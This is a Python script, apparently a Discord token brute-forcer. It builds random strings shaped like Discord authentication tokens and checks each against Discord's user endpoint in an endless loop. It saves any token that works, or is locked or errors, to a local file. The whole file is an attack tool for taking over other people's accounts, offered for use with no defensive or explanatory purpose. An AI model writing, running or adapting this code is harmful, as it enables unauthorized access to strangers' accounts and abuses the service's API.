from requests import get
from random import choice

string = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789-_"

class color:
	green = '\033[92m'
	red = '\033[91m'
	gray = '\033[90m'
	reset = '\033[0m'

def start():
	part1 = ""
	part2 = ""
	part3 = ""
	for x in range(26):
		part1 += choice(string)
	if part1[0] == "-" or part1[0] == "_":
		return
	for x in range(6):
		part2 += choice(string)
	for x in range(38):
		part3 += choice(string)
	token = part1 + "." + part2 + "." + part3
	headers = {'Authorization': token}
	res = get('https://discord.com/api/v9/users/@me', headers=headers)
	if res.status_code == 200:
		print(f"{color.green}[VALID]{color.reset} - {token}")
		with open("storage.txt", "a") as f:
			f.write(f"{token}\n")
			f.close
	elif res.status_code == 401:
		print(f"{color.red}[INVALID]{color.reset} - {token}")
	elif res.status_code == 403:
		print(f"{color.gray}[LOCK]{color.reset} - {token}")
	else:
		with open("storage.txt", "a") as f:
			f.write(f"Error: {res.status_code} {token}\n")
			f.close

while True:
	start()